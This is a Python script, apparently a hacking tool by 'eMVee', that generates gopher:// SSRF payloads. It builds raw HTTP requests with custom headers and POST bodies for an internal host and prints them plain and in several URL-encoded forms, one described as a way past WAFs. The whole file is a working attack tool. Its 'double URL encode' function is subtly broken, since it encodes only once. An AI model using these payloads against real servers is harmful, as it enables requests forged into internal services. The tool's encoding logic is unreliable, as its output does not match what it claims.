#!/usr/bin/python3
import urllib.parse
import argparse
import sys

def banner():
    banner = '''
███████╗███████╗██████╗ ███████╗██████╗  ██████╗  ██████╗ ██████╗ ██╗  ██╗███████╗██████╗ 
██╔════╝██╔════╝██╔══██╗██╔════╝╚════██╗██╔════╝ ██╔═══██╗██╔══██╗██║  ██║██╔════╝██╔══██╗
███████╗███████╗██████╔╝█████╗   █████╔╝██║  ███╗██║   ██║██████╔╝███████║█████╗  ██████╔╝
╚════██║╚════██║██╔══██╗██╔══╝  ██╔═══╝ ██║   ██║██║   ██║██╔═══╝ ██╔══██║██╔══╝  ██╔══██╗
███████║███████║██║  ██║██║     ███████╗╚██████╔╝╚██████╔╝██║     ██║  ██║███████╗██║  ██║
╚══════╝╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝  ╚═════╝ ╚═╝     ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                                                                                          
Created by eMVee 
    '''
    return banner

def url_encode_payload(data):
    # Force encoding of all characters, including slashes, by setting safe=''
    return urllib.parse.quote(data, safe='')

def double_url_encode_payload(data):
    # Re-encode the already single-encoded string
    return urllib.parse.quote(data, safe='')

def another_option(data):
    # Alternative encoding method tailored for specific WAFs or tools like Burp Suite
    return data.replace(':', '%3a').replace('/', '%2F').replace('%20', '%2520').replace('%0A', '%250a').replace('%0D', '%250d')

def host_header(host):
    return "Host: " + host

def generate_gopher_request(host, port, endpoint, method):
    return f"gopher://{host}:{port}/_{method} {endpoint} HTTP/1.1"

def generate_gopher_payload(host, port, endpoint, custom_headers, method, post_data=""):
    # Strictly use \r\n (CRLF) as required by the HTTP protocol specification
    payload = generate_gopher_request(host, port, endpoint, method) + "\r\n"
    payload += host_header(host) + "\r\n"
    
    if method == "POST" and post_data:
        if "Content-Type" not in custom_headers:
            custom_headers["Content-Type"] = "application/x-www-form-urlencoded"
        if "Content-Length" not in custom_headers:
            custom_headers["Content-Length"] = str(len(post_data))

    for header, value in custom_headers.items():
        payload += f"{header}: {value}\r\n"
    
    payload += "\r\n"
    
    if method == "POST" and post_data:
        payload += post_data
        
    return payload

def parse_headers(headers_list):
    custom_headers = {}
    if headers_list:
        for header in headers_list:
            try:
                name, value = header.split(':', 1)
                custom_headers[name.strip()] = value.strip()
            except ValueError:
                print(f"[!] Invalid header format: {header}")
                print("Headers should be in the format 'Name:Value'")
                sys.exit(1)
    return custom_headers

def main():
    parser = argparse.ArgumentParser(description='Gopher payload generator with custom headers support')
    parser.add_argument('-u', '--host', help='Target host address')
    parser.add_argument('-p', '--port', help='Gopher port number')
    parser.add_argument('-e', '--endpoint', help='Target endpoint')
    parser.add_argument('-H', '--headers', nargs='*', help='Custom headers in format "Name:Value"')
    parser.add_argument('-m', '--method', help='HTTP method (GET, POST, PUT, etc.)')
    parser.add_argument('-d', '--data', help='POST data body parameters')
    
    args = parser.parse_args()

    print(banner())

    if args.host:
        host = args.host
    else:
        print("[?] What is the address of the Host? ")
        host = input()

    if args.port:
        port = args.port
    else:
        print("[?] What port should be used for gopher? ")
        port = input()

    if args.endpoint:
        endpoint = args.endpoint
    else:
        print("[?] What endpoint should be used for gopher? ")
        endpoint = input()

    if args.method:
        method = args.method.upper()
    else:
        print("[?] What HTTP method should be used? (GET, POST, PUT, etc.) ")
        method = input().upper()
        if not method:
            method = "GET"

    post_data = ""
    if method == "POST":
        if args.data:
            post_data = args.data
        else:
            print("[?] Enter POST data body parameters: ")
            post_data = input().strip()

    if args.headers:
        custom_headers = parse_headers(args.headers)
    else:
        custom_headers = {}
        print("[?] Would you like to add custom headers? (y/n)")
        if input().lower() == 'y':
            while True:
                print("[?] Enter header (or press enter to finish): ")
                user_input = input().strip()
                if not user_input:
                    break
                header, value = user_input.split(":")
                custom_headers[header.strip()] = value.strip()

    try:
        payload = generate_gopher_payload(host, port, endpoint, custom_headers, method, post_data)
        
        print("\n[!] Plain text payload (Visualized CRLF):")
        # Explicitly display \r\n characters for easier visual debugging in the terminal
        print(payload.replace('\r', '\\r').replace('\n', '\\n\n'))

        # The gopher:// prefix must remain unencoded, only the HTTP request block gets encoded
        gopher_prefix = f"gopher://{host}:{port}/_"
        http_part = payload[len(gopher_prefix):]
        final_single_encoded = gopher_prefix + url_encode_payload(http_part)

        print("\n[!] URL encoded payload:")
        print(final_single_encoded)
        
        print("\n[!] Double URL encoded payload:")
        # Depending on the SSRF backend implementation, the prefix may or may not need encoding
        print(gopher_prefix + double_url_encode_payload(http_part))
        
        print("\n[!] Another option that might work via something like BURP:")
        print(another_option(final_single_encoded))

    except KeyboardInterrupt:
        print("\n[!] Script interrupted by user. Exiting...")
        sys.exit(1)

if __name__ == "__main__":
    main()
